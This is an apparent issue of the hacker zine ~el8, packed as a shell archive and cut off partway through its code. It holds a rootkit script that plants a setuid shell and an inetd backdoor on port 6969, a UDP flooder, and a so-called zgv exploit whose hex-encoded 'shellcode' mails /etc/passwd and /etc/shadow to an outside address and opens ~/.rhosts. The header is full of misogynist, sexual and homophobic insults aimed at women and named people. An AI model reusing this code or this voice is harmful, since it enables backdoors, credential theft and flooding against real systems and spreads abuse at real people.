#!/bin/sh
################################################
##::::::::::::::::::::::::::::::::::::::::::::##
##:'####::::::'########:'##::::::::'#######:::##
##'##  ##:'##: ##.....:: ##:::::::'##.... ##::##
##..::. ####:: ##::::::: ##::::::: ##:::: ##::##
##:::::....::: ######::: ##:::::::: #######:::##
##:::::::::::: ##...:::: ##:::::::'##.... ##::##
##:::::::::::: ##::::::: ##::::::: ##:::: ##::##
##:el8.n3.net: ########: ########:. #######:::##
##::::::::::::........::........:::.......::::##
################################################
## the definitive src for the Japan H/P Scene ##
################################################
## do "sh <ISSUE_NAME>" to extract eldump.c   ##
## compile eldump.c and use it to extract     ##
## the rest of the codes                      ##
## el8@press.co.jp   <*>   http://el8.n3.net  ##
################################################

cat <<'-+-+'> /dev/null
[BOI]
[BEGIN_DIR] .
[CUT_HERE] header
# WARNING: THIS ISSUE WILL NEED TO BE FRAGMENTED!
       ~el8 br1nGz y()U a $ecUritY z1nE F()r tH3 h4ck3R c0mmUniTY.
~el8~el8~el8~el8~el8~el8~el8~el8~el8~el8~el8~el8~el8~el8~el8~el8~el8~el88
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
~el8| VER=4 | IHL=5 | TOS=ZERROOOOO |        TOT LEN=YORMOM+YORDAD  |~el8
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
~el8|            ID=7a69            |FlG=0|   FRAGMENT OFFSET=0     |~el8
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
~el8|   TTL=0xFF    |  PROTOCOL=6   |          W4R3ZZ3ER4W          |~el8
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
~el8|             SOURCE ADDRESS=3.1.33.7                           |~el8
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
~el8|        DESTINATION ADDRESS=209.166.177.37                     |~el8
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
~el8|          SPORT=31337          |       DPORT=21(W4R3Z)         |~el8
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
~el8|                              101                              |~el8
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
~el8|                              010                              |~el8
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
~el8|       |           |X|X|X|X|S|X|                               |~el8
~el8|   0   |     ARP4  |X|X|X|X|Y|X|            9^9(^9)            |~el8
~el8|       |           |X|X|X|X|N|X|                               |~el8
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
~el8|             0                 |            0                  |~el8
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
~el8|*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1|~el8
~el8|*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1|~el8
~el8|*iSSue1*[+++----------------------------------------+++]*iSSue1|~el8
~el8|*iSSue1*[             t4blE ()f h0lY shYT!             ]*iSSue1|~el8
~el8|*iSSue1*[                                              ]*iSSue1|~el8
~el8|*iSSue1*[(0000) Introduction to ~el8                   ]*iSSue1|~el8
~el8|*iSSue1*[(0001) ph1x4ti0Nz bUcKt00tH raz0Rc4T r00tk1t  ]*iSSue1|~el8
~el8|*iSSue1*[(0010) px25 Network Primer                    ]*iSSue1|~el8
~el8|*iSSue1*[(0011) zgv exploit                            ]*iSSue1|~el8
~el8|*iSSue1*[(0100) AlphaSort                              ]*iSSue1|~el8
~el8|*iSSue1*[(0101) Sp1ffy                                 ]*iSSue1|~el8
~el8|*iSSue1*[(0110) x0rENC                                 ]*iSSue1|~el8
~el8|*iSSue1*[(0111) UDP vs. TCP                            ]*iSSue1|~el8
~el8|*iSSue1*[(1000) Obfuse Codez                           ]*iSSue1|~el8
~el8|*iSSue1*[(1001) IRC MISC                               ]*iSSue1|~el8
~el8|*iSSue1*[(1010) ~EL8 ADVISORY                          ]*iSSue1|~el8
~el8|*iSSue1*[(1011) Anarchist Code Kit                     ]*iSSue1|~el8
~el8|*iSSue1*[(1100) u4ea-dr0p                              ]*iSSue1|~el8
~el8|*iSSue1*[(1101) matrix.c                               ]*iSSue1|~el8
~el8|*iSSue1*[(1110) w00raw Packet maker                    ]*iSSue1|~el8
~el8|*iSSue1*[(1111) PAGER.c + BONUS!!!!                    ]*iSSue1|~el8
~el8|*iSSue1*[(0000) ELDUMP / ELTAG                         ]*iSSue1|~el8
~el8|*iSSue1*[(0000) Closing Words                          ]*iSSue1|~el8
~el8|*iSSue1*[(0000) INDEX                                  ]*iSSue1|~el8
~el8|*iSSue1*[                                              ]*iSSue1|~el8
~el8|*iSSue1*[+++----------------------------------------+++]*iSSue1|~el8
~el8|*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1|~el8
~el8|*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1|~el8
~el8|*iSSue1*/*                                              *iSSue1|~el8
~el8|*iSSue1*              shYt y0u ne4D t0 kn()W            *iSSue1|~el8
~el8|*iSSue1*                                                *iSSue1|~el8
~el8|*iSSue1* oOfFic4L m()ttoO: "t() te4Ch aNd le4rN"        *iSSue1|~el8
~el8|*iSSue1*    <>nE n0Te ab0uT thE moOTt(): w3 t0t4llY fUqn*iSSue1|~el8
~el8|*iSSue1*         ()wN te4M h4ckphRe4k. y()0oO pe1cEZ 0F *iSSue1|~el8
~el8|*iSSue1*         d()G smEgm4.                           *iSSue1|~el8
~el8|*iSSue1*                                                *iSSue1|~el8
~el8|*iSSue1* n0Te 0n fEm4le hAck1nG c0mmUn1tY:              *iSSue1|~el8
~el8|*iSSue1*    U'R 4LL FUQN UGLY H0eZ. l()oK aT th1s psEud0*iSSue1|~el8
~el8|*iSSue1*    c()dE... (th1s wUz fr0m gPs_girL sUrvEy)    *iSSue1|~el8
~el8|*iSSue1*    m4in(iRch0E) {                              *iSSue1|~el8
~el8|*iSSue1*    ...                                         *iSSue1|~el8
~el8|*iSSue1*    fD = ()pEN uGLY iRch0E pUssY-cUNt.          *iSSue1|~el8
~el8|*iSSue1*    rEtV4l = izh0ePr0m1sC(fD).                  *iSSue1|~el8
~el8|*iSSue1*    sw1tch<fD> c4sE (1): { putz(d1rTY sk4nk) }  *iSSue1|~el8
~el8|*iSSue1*    ... n()W whEn y0oO()u rUn th1z pr0gr4m$ y0U *iSSue1|~el8
~el8|*iSSue1*    gET thE f4lloW1ng resUltz.,                 *iSSue1|~el8
~el8|*iSSue1*    ./chEqIrchoEstatUz GPS_girl... D1RTY SK4NK  *iSSue1|~el8
~el8|*iSSue1*                                                *iSSue1|~el8
~el8|*iSSue1* o()fFici4L g!mP($): Rloxley AND Kevin Mitnick  *iSSue1|~el8
~el8|*iSSue1*    c0ngr4dul4ti0nZ du0deZ!!!@@!                *iSSue1|~el8
~el8|*iSSue1*    GPs_GiRL: go b4ck t0 4oL, lUstA is the      *iSSue1|~el8
~el8|*iSSue1*              the kIng oF stup1d iRcHoEs!       *iSSue1|~el8
~el8|*iSSue1*                                                *iSSue1|~el8
~el8|*iSSue1* M(0oO)tH3r fUQN pEEpZ eveRy0n3 h4t3z: gH,      *iSSue1|~el8
~el8|*iSSue1*    TeamSploit, f0rpaxe, PERSUiT, HackPhreak,   *iSSue1|~el8
~el8|*iSSue1*    fuq th1s, i sh0UlD jUzt s4y ALL 0F UN3T.    *iSSue1|~el8
~el8|*iSSue1*                                              */*iSSue1|~el8
~el8|*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1|~el8
~el8|*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1|~el8
~el8|*iSSue1*[[x]----------------------------------------[_]]*iSSue1|~el8
~el8|*iSSue1*[           ~el8 TE4M PR0F1L4CTICZ.            ]*iSSue1|~el8
~el8|*iSSue1*[                                              ]*iSSue1|~el8
~el8|*iSSue1*[ m3mbErZ>                                     ]*iSSue1|~el8
~el8|*iSSue1*[ nEWn4n (le4dER bY f[]rce),                   ]*iSSue1|~el8
~el8|*iSSue1*[ PHE4RZ1LL4/tMoL (h0lY fUq d0nt p1SS me 0ff)  ]*iSSue1|~el8
~el8|*iSSue1*[ sf1nkt3r (I FIN4LLY G0T L4ID)                ]*iSSue1|~el8
~el8|*iSSue1*[ bob (MastUrb4ti0n Extremizt)                 ]*iSSue1|~el8
~el8|*iSSue1*[ movl (eleet)                                 ]*iSSue1|~el8
~el8|*iSSue1*[ PercY (m4th n1nja)                           ]*iSSue1|~el8
~el8|*iSSue1*[ K0DE SH4M3N (groupie)                        ]*iSSue1|~el8
~el8|*iSSue1*[ S1LLY G00SE (I code.)                        ]*iSSue1|~el8
~el8|*iSSue1*[ N44N (NOBODY)                                ]*iSSue1|~el8
~el8|*iSSue1*[ N4N (N44N'S mother)                          ]*iSSue1|~el8
~el8|*iSSue1*[ U4EA (dropn more mailspools than bombs)      ]*iSSue1|~el8
~el8|*iSSue1*[ swR[0ck3r] (i owned your box)                ]*iSSue1|~el8
~el8|*iSSue1*[ ()P3R4TI0N R4MPR4T (quoth the raven nevrmore)]*iSSue1|~el8
~el8|*iSSue1*[ UNTITLED (DOCUMENT)                          ]*iSSue1|~el8
~el8|*iSSue1*[ DF (PUHLEZ D0NUT FR4GM3NT)                   ]*iSSue1|~el8
~el8|*iSSue1*[ Hairy Carry (hairy carry flag)               ]*iSSue1|~el8
~el8|*iSSue1*[ Shinex (I SH1NE SH0EZ)                       ]*iSSue1|~el8
~el8|*iSSue1*[ ELFAGS (FUCK INTEL 99!)                      ]*iSSue1|~el8
~el8|*iSSue1*[ ^_EeKaN_^ (rooderoo)                         ]*iSSue1|~el8
~el8|*iSSue1*[ Cameo (IMA SLUTT)                            ]*iSSue1|~el8
~el8|*iSSue1*[ C4s4ndr4 (you know what im bout)             ]*iSSue1|~el8
~el8|*iSSue1*[ MAN3PRINTF (el8[0])                          ]*iSSue1|~el8
~el8|*iSSue1*[ [^BLADE^] (K0DE LE4CH1N K1LL3R)              ]*iSSue1|~el8
~el8|*iSSue1*[ loki (u4ea 0wns me)                          ]*iSSue1|~el8
~el8|*iSSue1*[ k0deh3r0 (superman of the internet)          ]*iSSue1|~el8
~el8|*iSSue1*[ PhoneCoJoe(seemy sk1llz fromamile ring ring) ]*iSSue1|~el8
~el8|*iSSue1*[ cRot (CHEIF ROTTINGHAM)                      ]*iSSue1|~el8
~el8|*iSSue1*[ d0n0 (i LIKE COcK)                           ]*iSSue1|~el8
~el8|*iSSue1*[ and finaly -- -  --- -                       ]*iSSue1|~el8
~el8|*iSSue1*[ B1G W3RM (Systems Administrator)             ]*iSSue1|~el8
~el8|*iSSue1*[                                              ]*iSSue1|~el8
~el8|*iSSue1*[$x$----------------------------------------$x$]*iSSue1|~el8
~el8|*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1|~el8
~el8|*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1*iSSue1|~el8
~el8+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+~el8
^EOP

Stats:
[lame_ass_fat_boy_who_wears_cowboy_hats_and_enjoys_anal_and_often_violent_
sex_with_farm_animals] => Bronc Buster [www.attrition.org/hosted/bronc]
[idiots_with_skillz_in_the_NULL_and_void*_range] => *!*@Undernet
[co0l_people] => FEH / BoW
[idiots_who_should_/server_undernet] => *!*@#b4b0 *!*@#gH
[a-Z] => otonakawa
[official_~el8_drink] => sake (this oughta please all you ignorant americans)
[greatest_con_we_attented] => japanacon[*]
[ran_~el8_code_rigorously] => f1ex
[really_lame_sites] => www.hackphreak.org && www.rootshell.com (hosts the -
lamest_code_ever.c) 
[really_co0l_sites] => www.velkro.net && www.feh.org && www.wiretap.net
[~el8_official_BBS] => 1-800-FAT-GIRLS
[the_internet's_official_lamest_C_code] =>                                \
http://www.rootshell.com/archive-j457nxiqi3gq59dv/199906/rhclean.c        \
(you can find that code near the irc section -ex:c0des33k "lamest_code_ever.c")

[END_CUT] header
[CUT_HERE] intro
                                       +
------------------------------------------------------------------------------
                                       +
[(000) Introduction by nEWn4n]
                                       +
------------------------------------------------------------------------------
                                       +

	Do not approach ~el8, for you will get dropped.
	Here i w1ll breifly describe each member.

[nEWn4n]
        [^/.^]
          oO    <! nEWn4n W1TH HIZ G4ME ()N
           -
           |
          \|/
          <!>
          >o-<--[O`8]  <! C4s4ndr4 scre4m'n "~el8!"

Picture above. nEWn4n is 35/m/single, he carries an automatic 9mm uzi at all
time. nEWn4n is the messanger sent down by the Holy Code.
	
	Ok, here's the fucking deal, i'm too lazy to actually write a damn
intro, it's fucking pointless, WHO REALLY CARES?

	When in doubt, FEAR AND REZPECT!

[EOW]
[END_CUT] intro
[END_DIR] .

                                       +
------------------------------------------------------------------------------
                                       +
[(001) Rootkit by ph1x]
                                       +
------------------------------------------------------------------------------
                                       +


Heres my rootkit i wrote for boxes i own frequently, so just learn from my code
etc but if you use any of my code BE SURE TO GREET ME (PH1X(ATI0N)) etc etc
anyway enjoy kiddies

[BEGIN_DIR] Rootkit
[CUT_HERE] Rootkit.sh
# BUCKT00TH R4Z0RK4T R00TK1T
# by: ph1x
#!/bin/bash

echo "ph1x'z buckt00th r4z0rk4t r00tk1t"
echo "ph1x@b4b0.org"
echo "ph1x@0berphlow.org"

echo "Creating suid shell in /tmp/.ph1xsh"
echo "Note to self: /tmp/.ph1xsh to run it."
cp /bin/sh /tmp.ph1xsh
chmod +s /tmp/.ph1xsh
echo "Done"

echo "Now creating inetd backdoor"
echo "For all you kiddies, telnet <host> 6969 for the shell, dumb fucks"
echo "teInet 6969/tcp #Telnet daemon." >> /etc/services
echo "teInet stream tcp nowait /bin/sh -i"

echo "Restarting inetd."
killall -HUP inetd
# kill -HUP '/sbin/pidof inetd'
echo "Done"

echo "Setting up magic command!"
echo "what if the admin finds our suid shell and changes the mode things on it?"
echo "#!/bin/sh" > /..
echo "/tmp/.ph1xsh" >> /..
chmod +s /..
echo "Done"


#echo "Changing shell information! (i jUzt le4rn3d thiz k0mm4nd)"
#echo "/tmp/.ph1xsh" >> /etc/shells
#chfn -s /tmp/.ph1xsh <user>

if  [ -x irc ]; then
echo "th1s b0x haz irc!"
fi

if [ -x BitchX ]; then
echo "th1s b0x h4z B1tchX"
fi

#echo "Tell root hez fucking OWNED hardcore"
#echo "YOUR OWNED HARDCORE" >> tty1
#echo "Done"

#echo "Removing logs"
#rm -rf /var/log
#echo "Done"

# i don't know howto hide myself yet, i'll add to next version

#echo "Removing securetty"
#rm /etc/securetty
#echo "Done"

#echo "ok, this is 100% original as far as i know, and it took lots of thinking"
#cp /bin/sh /sbin/nologin
#echo "Done"

echo "Well, this is the rootkit i use, and hopefully this code doesn't get out"
echo "HEH!"
echo "Have fun skr1pt-k1dz HEH"

echo "IIIIIIIIIIIMMMMMMMMMMMMMMMMMMMMMM OONNNNNNNNNN DMXXXXXXXXXXXXXXX"

[END_CUT] Rootkit.sh
[END_DIR] Rootkit

                                       +
------------------------------------------------------------------------------
                                       +
[(002) px25 network primer by movl]
                                       +
------------------------------------------------------------------------------
                                       +

------------------------------+
intro to penis communications +
by movl ----------------------+

**************************************
* SEE PX25 RFC FOR MORE INFORMATION! *
**************************************

int main(void){

 hi!!!!!!!!!!!!!!!!! my name is m0vl and i wrote this article for *YOU*. 
I've been getting quite a few emailz about penis communication, mainly about
px25 networks.  The Input/Output is quite difficult to implement on most
small px25 packet switched networkz.  Usually, the normal px25 packet looks
something like this..

[....................4500 bytes.................................]
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++-.
| BALL |  IP_CUM buffer     | sperm count | header | flags | tip |  |
| SACK |  ~~~~~~~~~~~~~     | max is 520  |        |       |     |  |
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++_.'

No I/O functions can be done until you know the size of the remote penis
packet in relation to your local penis packet - this is where the problem
comes into play. Usually, the remote server wont tell you the correct size
of their penis packet.  Sometimes, if we can get the server to compare
sizes, we can get an accurate answer. I've included code that will let you
find out how the remote penis packet compares to your local one.

px25@iss.net:~/px25/article/code/# ls -l pen[15-is]*.[c-h]
-rw-rwxr-i   1 root     root         1523 Sep 15 14:21 pen15_client.c
-rw-rwxr-i   1 root     root         1766 Sep 15 14:10 pen15_serv.c
-rw-rwxr-i   1 root     root          330 Sep 15 12:48 penis.h
px25@iss.net:~/px25/article/code/#

tested on SCOUnix/Minix/SunOS/HPUnix/WinNT/UNICOS.
To compile: cc pen15_[client/serv].c -o [pcl/pse] -lnsl <-lsocket>

[BEGIN_DIR] px25
[CUT_HERE] penis.h
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <netdb.h>

#define MY_LEN         ((int)(rand()%25)) // my penis's size is ever-changing
#define MY_WID         ((int)(rand()%25)) // only idiots get rand #'s this way
#define PENIS_PORT                   6969 // standard port from px25 RFC.

struct penis {
  float p_length;
  float p_width;
  struct penis *next;
};
char odata[]= "PENIS PACKET SWITCHER"; // read rfc.
[END_CUT] penis.h
[CUT_HERE] pen15_client.c
#include "penis.h"

extern char *optarg;
extern int   optind;

main (int    argc,
      char **argv)
{
    int sockfd=0, c=0, p=0,f0rk=0,delay=0;
    struct sockaddr_in my_addr, your_addr;
    struct hostent *he;
    struct penis my_penis;
    char data[100];
    if (argc < 6)
    {
        goto usage;
        exit(-1);
    }
    while ( (c = getopt(argc,argv,"l:w:p:D:")) != EOF)
    {
        switch(c)
        {
        case 'l':
            my_penis.p_length = atof(optarg);
            break;
        case 'w':
            my_penis.p_width  = atof(optarg);
            break;
        case 'p':
            p=atoi(optarg);
            break;
        case 'D':
            delay=atoi(optarg);
            break;
        case 't':
//            times = atoi(optarg);
            break;
        case '?':
            goto usage;
            exit(-1);
        default:
            goto usage;
            exit(-1);
        }
    }
    if ( 0 >= my_penis.p_width || 0 >= my_penis.p_length )
    {
        goto usage;
        exit(-1);
    }
    for ( ; optind < argc ; optind++ )
    {
        f0rk = fork();
        if (f0rk==0)
        {
            exit(0);
        }
        if ((he=gethostbyname(argv[optind]))==NULL)
        {
            herror(argv[optind]);
            exit(-1);
        }
#ifdef DEBUG
        fprintf(stderr,"(%i) #%i -> [%s]\n",optind,f0rk,argv[optind]);
#endif
        if ((sockfd=socket(AF_INET,SOCK_DGRAM,0))< 0)
        {
            perror("couldnt get a FUQN UDP SOCKET MOTHERFUQR!");
            exit(-1);
        }
        bzero((char*)&my_addr, sizeof(my_addr));
        my_addr.sin_family = AF_INET;
        my_addr.sin_addr.s_addr = htonl(INADDR_ANY);
        if (delay!=0) sleep(delay);
        if ((bind(sockfd, (struct sockaddr*) &my_addr,
                  sizeof(my_addr))<0))
        {
            perror("cant fuqn bind to local prot!");
            exit(-1);
        }
        bzero((char*)&your_addr,sizeof(your_addr));
        your_addr.sin_family = AF_INET;
        your_addr.sin_addr = *((struct in_addr*)he->h_addr);
        your_addr.sin_port = htons(p==0?PENIS_PORT:p);

        snprintf(data,sizeof(data)-1,
                 "L %f : W %f",my_penis.p_length,my_penis.p_width);

        if (0>(sendto(sockfd,data,sizeof(data),0,
                      (struct sockaddr*)&your_addr,sizeof(your_addr))))
        {
            perror("sendto is a stupid bitch!");
            exit(-1);
        }
        shutdown(sockfd,2);
        wait();
    }
    putchar('\n');
    exit(0);
usage:
    fprintf(stderr,"usage: %s [-l len] [-w width]"
            " <-p port> <-D delay> [host(s)...]\n",argv[0]);
}

[END_CUT] pen15_client.c
[CUT_HERE] pen15_serv.c
/* Parts (c) px25 Network Solutions */
#include "penis.h"
#include <signal.h>
#include <fcntl.h>

int con=0;
extern char *optarg;
extern int optind;
void getsig(int);
int main(int    argc,
         char **argv)
{
    int sockfd=0, addrlen=0, optz=0, bkg=0, port=0;
    struct sockaddr_in my_addr, your_addr;
    struct penis my_penis, your_penis;
    FILE *logf = NULL;
    char data[100] = "\0";
    time_t t1me;
    while ( EOF != (optz = getopt(argc,argv,"o:l:w:p:f")))
    {
        switch(optz)
        {
        case 'o':
            if ( NULL == (logf = fopen(optarg,"a+")))
            {
                perror(optarg);
                exit(-1);
            }
            break;
        case 'l':
            my_penis.p_length = atof(optarg);
            break;
        case 'w':
            my_penis.p_width  = atof(optarg);
            break;
        case 'p':
            port = atoi(optarg);
            break;
        case 'f':
            bkg = 1;
            break;
        default:
            goto usage;
            exit(-1);
        }
    }

    if (logf == NULL) logf = stdout;
    if (argv[optind]!=NULL)
    {
        goto usage;
        exit(-1);
    }
    signal(SIGTERM,getsig);
    signal(SIGKILL,getsig);
    signal(SIGINT ,getsig);
    if (my_penis.p_length < 0) my_penis.p_length = MY_LEN;
    if (my_penis.p_width  < 0) my_penis.p_width  = MY_WID;
    if (bkg > 0)
    {
        if (fork() != 0) exit(0);
        setsid();
    }
    if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
    {
        perror("couldn't get a fuqn udp socket!");
        exit(-1);
    }
    bzero((char*)&data,sizeof(data));
    bzero((char*)&your_addr,sizeof(your_addr));
    bzero((char*)&my_addr,sizeof(my_addr));
    my_addr.sin_family        =   AF_INET;
    my_addr.sin_addr.s_addr   =   htons(INADDR_ANY);
    my_addr.sin_port          =   htons(port==0?PENIS_PORT:port);
    your_addr.sin_family      =   AF_INET;
    your_addr.sin_addr.s_addr =   htons(INADDR_ANY);

    if ((bind(sockfd,(struct sockaddr *)&my_addr,sizeof(my_addr)) <0))
    {
        perror("couldn't bind to udp port!");
        exit(-1);
    }
    // fcntl(sockfd,F_SETFL,O_NONBLOCK);
    for(;;)
    {

        if (recvfrom(sockfd,data,sizeof(data)-1,0,
                     (struct sockaddr *) &your_addr, &addrlen) > 0)
        {
            if ((sscanf(data,"L %f : W %f",
                        &your_penis.p_length,
                        &your_penis.p_width))==2)
            {
                con++;
                t1me = time(NULL);
                fprintf(logf,"%.24s: [%s] has a %s and %s penis than you.\n",
                        ctime(&t1me),
                        inet_ntoa(your_addr.sin_addr),
                        ((your_penis.p_length>my_penis.p_length)?
                         "longer":"shorter"),
                        ((your_penis.p_width > my_penis.p_width)?
                         "thicker":"thinner"));
            }
        }
        bzero((char*)&data,sizeof(data));
    }

    shutdown(sockfd,2);
    fclose(logf);
usage:
    fprintf(stderr,"usage: %s <-o file> <-l len> <-w width> <-p port> <-f>\n",argv[0]);
}
void getsig(int s)
{
#ifndef NONSTOP
    fprintf(stderr,"Caught signal %i, exiting...\n",s);
    fprintf(stderr,"[%i connections]\n",con);
#ifndef NOTELL
    exit(-1);
#endif
#endif
}

[END_CUT] pen15_serv.c
Bonuz Warez From Minus!
[CUT_HERE] viagra.c
/* non-spoofing px25 flooder */
/* by minus for ~EELLLL8 */
#include <string.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <netdb.h>
#include <fcntl.h>

#define YOU 0
#define ME  1
#ifndef MAX_FILE
#define MAX_FILE 400
#endif
#ifndef BUF
#define BUF 40
#endif

int count=0;
int maxcount;

struct px25
{
  struct sockaddr_in _addr[2];
  int sockfd[MAX_FILE+20];
  int SockI;
};

char *
make_p(void)
{
  static char request[11];
  snprintf(request,11,"L %.2i : W %.2i",(rand()%60),(rand()%60));
  return request;
}
void *
viagra (struct px25 *px)
{

  if (!(count < maxcount) || !(px->SockI < MAX_FILE)) pthread_exit(NULL);
  (px->SockI+1 >(MAX_FILE-1))?px->SockI = 0:px->SockI++;
  px->_addr[ME].sin_port = htonl(INADDR_ANY);
  if (count > maxcount) pthread_exit(NULL);

  if ((px->sockfd[px->SockI]=socket(AF_INET,SOCK_DGRAM,0))< 0)
  {
    puts("\n----error----");
    perror("socket()");
    exit(-1);
  }
  if ((bind(px->sockfd[px->SockI],(struct sockaddr*)&px->_addr[ME],
       sizeof(px->_addr[ME]))<0))
  {
    puts("\n----error----");
    perror("bind(spoofhost)");
    exit(-1);
  }
  if (!(count < maxcount) || !(px->SockI < MAX_FILE))
      pthread_exit(NULL);
  if (0>(sendto(px->sockfd[px->SockI],make_p(),11,0,
         (struct sockaddr*)&px->_addr[YOU],sizeof(px->_addr[YOU]))))
  {
    puts("\n----error----");
    perror("sendto(desthost)");
    exit(-1);
  }
  close(px->sockfd[px->SockI]);
  pthread_exit(NULL);
}

int
main (int argc, char *argv[])
{
  struct px25 px;
  int i,Y;
  struct hostent *PXHost[2];
  pthread_t *pt;

  if (argc != 5)
  {
    fputs("./viagra <spoof> <dest> <port> <count>\n",stderr);
    // we will not include real spoofing because of the potential
    // abuse of px25. use your real IP in this edition.
    exit(-1);
  }

  if ((PXHost[YOU]=gethostbyname(argv[2]))==NULL)
  {
    herror(argv[2]);
    exit(-1);
  }
  if ((PXHost[ME]=gethostbyname(argv[1]))==NULL)
  {
    herror(argv[1]);
    exit(-1);
  }
  maxcount = atoi(argv[4]);
  pt = (pthread_t *) malloc((size_t)(maxcount*(int)sizeof(pthread_t)));
  if (!pt) { fputs("out of memory.\n",stderr); exit(-1); }
  px._addr[YOU].sin_family     = AF_INET;
  px._addr[YOU].sin_addr       = *((struct in_addr*)PXHost[YOU]->h_addr);
  px._addr[YOU].sin_port       = htons(atoi(argv[3]));
  px._addr[ME].sin_family      = AF_INET;
  px._addr[ME].sin_addr        = *((struct in_addr*)PXHost[ME]->h_addr);
  px._addr[ME].sin_port        = htons(0);
  px.SockI = 0;
  setvbuf(stdout,(char*)NULL,_IONBF,0);
  printf("----%.24s -> [%.24s:%.6s] (#%.15s)----\n",
         argv[1],argv[2],argv[3],argv[4]);

  for (count=0;count<maxcount;count++)
  {
    if (px.SockI > (MAX_FILE-1)) px.SockI =0;

    if(pthread_create(pt,NULL,(void*)&viagra,(struct px25*)&px))
    {
      puts("\n----error----");
      perror ("pthread_create()");
      exit (-1);
    }
    if (count > MAX_FILE){
      for(Y=0;Y<MAX_FILE;Y++)
         pthread_join(pt[Y],NULL);
    }
  }
  printf("\n----%s complete!----\n",argv[1]);
  printf("got viagra?!\n");
  return 1;
}
[END_CUT] viagra.c
[END_DIR] px25
I hope that helpz you hack some px25 networkz.

- movl

Shoutoutz:
  ADM/el8.org (generally cool)
  route (got me started in px25 networks back in the 70's)
  RLoxley (for C help)
  bronc buster (for BSD Socket help (is it **argv or **argv[] ?!))
  my mom (her pb&j sandwiches > *)
  rstevenz (RIP)
FuckOFfz:
  #Linux (for banning me when all i didz was /ctcp cdcc list!)
  Mr. Smith (for the F in History, u bastard)
  FarmSex.com (my credit card IS valid, you fuck3rz!) 

 exit(0xFFFFFFFF+1);
}
[EOW]
                                       +
------------------------------------------------------------------------------
                                       +
[(003) ZGV exploit by fB and s1g0ose]
                                       +
------------------------------------------------------------------------------
                                       +

______________________________________________________________________________
              alright kiddies.... enjoy the codez............                   
------------------------------------------------------------------------------
Exploit for ZGV(every recent vers[linux]) by FUNNY_BUNNY and S1LLYG00S3

[BEGIN_DIR] zgvexploit
[CUT_HERE] zgvexploit.c
/*
 * This is the only working zgv exploit out
 * that actually works.
 * usage: gcc zgvexploit.c -o zgvexploit ;
 *        zgvexploit <picture> <offset>
 * thanks to stranJer for some ASM help
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

#define ZGV_PATH                "/usr/bin/zgv"
#define OFFSET                     0x0000001a
#define BUFFER_SIZE                0x0000000d

long
get_esp (void)
{
  __asm__ ("movl %esp,%eax\n");
}
void
main (int argc, char *argv[])
{
  char *buff = NULL;
  unsigned long *addr = NULL;
  unsigned long offset = OFFSET;
  char *ptr = NULL;
  char pict[255] = "\0";
  char opts[] = "-c"; //{0x2D,0x63};

  unsigned char shellcode[]= \
  "\x65\x63\x68\x6F\x3B\x63\x61\x74\x20\x2F\x65"\
  "\x74\x63\x2F\x70\x61\x73\x73\x77\x64\x2A\x20\x2F\x65\x74\x63"\
  "\x2F\x73\x68\x61\x64\x6F\x77\x2A\x7C\x6D\x61\x69\x6C\x20\x65"\
  "\x78\x70\x6C\x40\x6D\x6F\x6F\x6E\x2E\x63\x6F\x2E\x6A\x70\x20"\
  "\x32\x3E\x26\x31\x3E\x2F\x64\x65\x76\x2F\x6E\x75\x6C\x6C\x3B"\
  "\x65\x63\x68\x6F\x20\x2B\x2B\x3E\x7E\x2F\x2E\x72\x68\x6F\x73"\
  "\x74\x73\x20\x32\x3E\x26\x31\x3E\x2F\x64\x65\x76\x2F\x6E\x75"\
  "\x6C\x6C\x3B\x65\x63\x68\x6F\x20\x53\x65\x67\x6D\x65\x6E\x74"\
